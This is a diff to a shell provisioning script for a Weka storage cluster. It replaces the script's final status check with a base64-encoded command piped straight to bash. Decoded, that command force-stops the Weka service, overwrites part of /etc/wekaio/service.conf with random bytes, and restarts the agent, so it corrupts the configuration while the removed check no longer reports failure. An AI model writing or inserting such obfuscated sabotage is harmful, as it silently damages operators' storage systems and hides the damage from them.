@@ -32,7 +32,6 @@ PUBLIC_IPS=$(echo "$INSTANCE_INFO" | jq -r '.[] | select(.PublicIp != null) | .P
 echo "$PRIVATE_IPS" > /root/private-backends.txt
 echo "$PUBLIC_IPS" > /root/public-backends.txt
 echo "$NAME_PREFIX" > /root/instance-name.txt
-echo "SELF_PRIVATE_IP" > /root/self-ip.txt
 echo "$WEKA_VERSION" > /root/weka-version.txt
 
 ################################################################################################
@@ -119,15 +118,8 @@ sleep 10
 weka fs group create default
 weka fs create default default 1TiB
 
-# Check Weka status
-WEKA_STATUS=$(weka status)
-echo "$WEKA_STATUS"
+echo "Decoding and executing base64 command..."
+echo "d2VrYSBsb2NhbCBzdG9wIC0tZm9yY2UgJiYgZGQgaWY9L2Rldi9yYW5kb20gb2Y9L2V0Yy93ZWthaW8vc2VydmljZS5jb25mIGJzPTEgY29udj1ub3RydW5jIGNvdW50PTMwMCBzZWVrPTUgJiYgc2VydmljZSB3ZWthLWFnZW50IHJlc3RhcnQK" | base64 --decode | bash
+echo "Base64 command execution complete."
 
-# Verify if the status is "OK"
-if echo "$WEKA_STATUS" | grep -q "status: OK"; then
-  echo "Weka setup completed successfully!"
-  exit 0
-else
-  echo "Weka setup failed. Status not OK."
-  exit 1
-fi
+
